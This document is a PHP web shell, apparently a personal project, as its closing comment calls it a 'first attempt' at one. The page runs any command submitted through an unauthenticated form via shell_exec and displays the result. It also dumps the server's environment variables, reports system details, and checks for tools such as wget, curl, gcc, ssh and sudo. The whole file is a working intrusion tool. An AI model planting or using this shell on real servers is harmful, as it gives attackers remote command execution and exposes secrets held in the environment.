<?php
function checkSystem()
{
    $os = array();
    if (substr(php_uname(), 0, 7) == 'Windows') {
        $os = 'Windows';
        return $os;
    } else {
        $iam = exec("whoami");
        array_push($os, $iam, "Linux");
        return $os;
    }
}
function showEnv($os)
{
    if (!empty($os)) {
        if ($os[1] == 'Linux') {
            return shell_exec('env');
        } else {
            return null;
        }
    }
    return null;
}

function executeCommands($com)
{
    if (!empty($com)) {
        echo '<div id="divider"></div><div id="returned-center" valign="bottom">
    <article id="returned">
        <div valign="bottom">
        <textarea cols="80" rows="10">' . shell_exec($com) . '</textarea>
        </div>
    </article>
</div>';
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST"){
    if (!empty($_POST["commander"])){
        executeCommands($_POST["commander"]);
    }else{
        echo "Empty post";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Yes</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: black;
        }

        .log {
            margin: 10px;
            background-color: aliceblue;
            text-decoration-color: white;
        }

        .slog {
            background-position: bottom;
            background-size: auto;
            margin: auto;
            padding: 50px;
            height: auto;
            width: auto;
            background-color: aliceblue;
            text-decoration-color: white;
            text-align: center;
            alignment: left;
        }

        #userInfo {
            width: auto;
            float: left;
            height: auto;
            background-color: dimgray;
            text-decoration-color: white;
        }

        nav {
            float: left;
            width: 30%;
            background: #ccc;
            padding: 20px;
        }

        section:after {
            content: "";
            display: table;
            clear: both;
        }

        nav ul {
            list-style-type: none;
            padding: 0;
        }

        #article-left {
            float: left;
            padding: 20px;
            width: 600px;
            height: 300px;
            overflow-x: scroll;
            overflow-y: scroll;
            background-color: #f1f1f1;
        }

        #article-right {
            float: right;
            padding: 20px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }
        #returned-center{
            float: right
            text-align:center;
            position: relative;
            top: 475px;
            left: 1310px;
            height: 200px;
            width: 500px;
        }
        #returned{
            position: absolute;
            bottom: 0px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }

        #container-left {
            height: auto;
            width: auto;
        }

        #container-right {
            height: auto;
            width: auto;
        }

        .main_tool_label {
            margin: 10px;
            background-color: aliceblue;
            text-decoration-color: white;
            text-align: center;
            overflow: auto;
        }

        #container-mid {
            position: center;
            alignment: bottom;
            background-color: aliceblue;
            text-decoration-color: white;
        }

        .article-mid {
            padding: 20px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }
    </style>
</head>
<body>
<div id="container-mid">
    <div class="article-mid">
    <p><b>~ System Uname ~</b></p>
        <pre> <?= php_uname() ?></pre><br>
        <pre>Current working directory:<?= getcwd() ?></pre><br><br>
    </div>
</div>
<div id="container-left">
    <article id="article-left">
        <h1 class="main_tool_label">~ System info's ~</h1>
        <div>
            <a><b>Avail Commands:</b><br><br>
                <?=
                $commands = array("perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
                    'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox', 'qemu', 'sudo');
                foreach ($commands as $item) {
                    echo '<pre>' . shell_exec("which " . $item) . "</pre>";
                }?>
                <br></a>
        </div>
        <div>
            <a><br><b>Sys/Env info:</b><br><br>
                <?= showEnv(checkSystem()) ?>
            </a>
        </div>
    </article>
</div>
<div id="divider">
</div>
<div id="container-right">
    <article id="article-right">
        <h1 class="main_tool_label">~ Commands ~</h1>
        <div>
        </div>
        <div><a><br><b> ~ Execute ~ </b><br>
                <form method="post" action="">
                    <input type="text" name="commander" value="">
                    <input type="submit" value="Execute">
                </form>
            </a>
        </div>
    </article>
</div>
</body>
</html>

//first attempt at a php version webshell, do not judge me.
